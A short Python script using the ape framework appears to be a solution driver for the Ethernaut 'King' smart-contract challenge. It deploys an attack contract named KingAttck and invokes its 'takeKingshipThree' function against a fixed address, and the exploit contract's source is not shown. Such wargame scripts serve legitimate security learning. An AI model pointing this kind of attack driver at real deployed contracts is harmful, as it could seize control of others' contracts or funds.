from ape import project, accounts, convert


def deploy():
    account = accounts.load("ethernaut")
    contract = account.deploy(
        project.KingAttck,
        max_priority_fee="0.5 gwei",
        max_fee="1 gwei",
        sender=account,
        publish=True,
    )
    return contract


def sent_tx():
    account = accounts.load("ethernaut")
    contract = project.KingAttck.at("0x76cfB79Ca7966A0Fb01e928EAda73A831AE8f54F")

    contract.invoke_transaction(
        "takeKingshipThree",
        "0x9Ad19ea506D78965805dF36860b3A68Def674FAa",
        value=convert("0 eth", int),
        max_priority_fee="2 gwei",
        max_fee="4 gwei",
        sender=account,
    )


def main():
    sent_tx()
